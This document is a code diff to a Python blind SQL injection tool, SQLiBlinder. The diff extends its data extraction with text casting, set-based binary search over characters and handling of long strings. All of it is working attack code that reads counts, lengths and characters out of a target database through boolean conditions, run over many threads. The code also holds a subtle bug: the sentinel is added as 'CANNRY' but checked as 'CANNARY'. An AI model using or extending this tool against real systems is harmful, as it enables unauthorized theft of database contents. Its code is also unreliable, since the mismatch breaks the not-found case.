@@ -5,16 +5,27 @@ import logging
 class SQLiBlinder:
 	"""Blind SQL injector"""
 
-	def __init__(self, request_func, dbms, multithreaded=True, threads=16):
+	def __init__(self, request_func, dbms, multithreaded=True, threads=16, auto_string_convert=True, get_long_strings=False):
 		"""`request_func` - function, that take 1 param. If param is "1=1" request_func must return True,if param is "1=0" request_func must return False
 		 `dbms` - one of ["mysql","mssql","oracle","sqlite"]
 		 `multithreaded` - if True run number of threads, else one
-		 `threads` - number of threads (only for multithreaded)"""
+		 `threads` - number of threads (only for multithreaded)
+		 `auto_string_convert` - convert all columns to string (via CAST(col as TEXT) etc.
+		 `get_long_strings` - do find symbols after 64"""
 		self.request_func = request_func
 		self.dbms = dbms.lower()
 		self.init_params(self.dbms)
 		self.multithreaded = multithreaded
 		self.threads = threads
+		self.auto_string_convert = auto_string_convert
+		self.get_long_strings = get_long_strings
+		self.long_string_limit = 64
+
+	def get_column_expression(self,column):
+		if self.auto_string_convert:
+			return self.dbms.convert_to_text.format(column)
+		else:
+			return column
 
 	def init_params(self, dbms):
 		dbms_obj = engines.get(dbms, None)
@@ -32,7 +43,7 @@ class SQLiBlinder:
 	def define_string(self, table_name, column_name, index, where=None, order_by=None):
 		if order_by is None:
 			order_by = column_name
-		return f"{self.dbms.string_definition.format(column_name)} {self.get_from_clause(table_name, index, order_by, where)}" 
+		return f"{self.dbms.string_definition.format(self.get_column_expression(column_name))} {self.get_from_clause(table_name, index, order_by, where)}" 
 
 	def get_from_clause(self, table_name, index, order_by, where=None):
 		if table_name is None:
@@ -45,12 +56,12 @@ class SQLiBlinder:
 	def define_string_len(self, table_name, column_name, index, where=None, order_by=None):
 		if order_by is None:
 			order_by = column_name
-		return f"{self.dbms.string_len_definition.format(column_name)} {self.get_from_clause(table_name, index, order_by, where)}"
+		return f"{self.dbms.string_len_definition.format(self.get_column_expression(column_name))} {self.get_from_clause(table_name, index, order_by, where)}"
 
 	def define_string_char(self, table_name, column_name, index, string_pos, where=None, order_by=None):
 		if order_by is None:
 			order_by = column_name
-		return f"{self.dbms.string_char_definition.format(column_name, string_pos)} {self.get_from_clause(table_name, index, order_by, where)}"
+		return f"{self.dbms.string_char_definition.format(self.get_column_expression(column_name), string_pos)} {self.get_from_clause(table_name, index, order_by, where)}"
 
 	def define_count(self, table_name, where=None):
 		to_where = ""
@@ -64,6 +75,11 @@ class SQLiBlinder:
 			return f"({query})>=hex(char({value}))"
 		else:
 			return f"({query})>={value}"
+
+	def build_sql_binary_set_query(self,query,subset):
+		
+		converted_subset = ','.join([self.dbms.binary_set_format.format(ord(a)) for a in subset])
+		return f"({query}) not in ({converted_subset})"
 
 	def get_bool(self, sql):
 		return self.request_func(sql)
@@ -100,6 +116,29 @@ class SQLiBlinder:
 				cur_val -= move
 			move = move/2
 
+	def binary_search_set(self, s, alph_set):
+		if len(alph_set)==0:
+			return False
+		alph_set += ['CANNRY']
+		while True:
+			l = len(alph_set)
+			first_part = alph_set[:l//2]
+			sql = self.build_sql_binary_set_query(s,first_part)
+			logging.debug(sql)
+			r = self.get_bool(sql)
+			logging.debug(r)
+			if not r:
+				new_alph_set = first_part
+			else:
+				new_alph_set = alph_set[l//2:]
+			if len(new_alph_set) == 1:
+				if new_alph_set[0]=='CANNARY':
+					return False
+				else:
+					return new_alph_set[0]
+			alph_set = new_alph_set
+			logging.debug(f'new subset: {new_alph_set}')
+
 	def get_count(self, table_name, where=None):
 		s = self.define_count(table_name, where)
 		return self.binary_search(s, 32, False, True)
@@ -112,32 +151,41 @@ class SQLiBlinder:
 	def get_length_of_string(self, table_name, column_name, index, where=None, order_by=None):
 		s = self.define_string_len(
 			table_name, column_name, index, where, order_by)
-		return self.binary_search(s, 32, False, True)
+		if self.get_long_strings: 
+			result =  self.binary_search(s, 32, start_val_defined=False, search_for_number=True)
+		else:
+			result = self.binary_search(s,self.long_string_limit,start_val_defined=True,search_for_number=True)
+		#print (self.get_long_strings, result)
+		return result
 
-	def get_char(self, table_name, column_name, index, str_pos, where=None, order_by=None):
+	def get_char(self, table_name, column_name, index, str_pos, where=None, order_by=None, alphabet=None):
 		s = self.define_string_char(
 			table_name, column_name, index, str_pos, where, order_by)
-		return chr(self.binary_search(s, 256, True))
+		if alphabet is None:
+			return chr(self.binary_search(s, 256, True))
+		else:
+			return self.binary_search_set(s,alphabet)
 
 	def get_char_for_pool(self, chunk):
 		return self.get_char(*chunk)
 
-	def get_string(self, table_name, column_name, index, where=None, order_by=None):
+	def get_string(self, table_name, column_name, index, where=None, order_by=None, alphabet=None):
 		l = self.get_length_of_string(
 			table_name, column_name, index, where, order_by)
 		logging.debug(f"length({column_name},{index}): {l}")
 		r = ""
+		suffix = '[...]' if (l == self.long_string_limit-1) else ''
 		if not self.multithreaded:
 			for i in range(l):
 				r += self.get_char(table_name, column_name,
-								   index, i + 1, where, order_by)
+								   index, i + 1, where, order_by, alphabet)
 				# print r
-			return r
+			return r + suffix
 		else:
 			with ThreadPoolExecutor(max_workers=self.threads) as pool:
 				r = "".join(list(pool.map(self.get_char_for_pool, [
-							(table_name, column_name, index, i + 1, where, order_by) for i in range(l)])))
-				return r
+							(table_name, column_name, index, i + 1, where, order_by, alphabet) for i in range(l)])))
+				return r + suffix
 
 	def get(self, columns, table_name, where=None, order_by=None):
 		count = self.get_count(table_name, where)
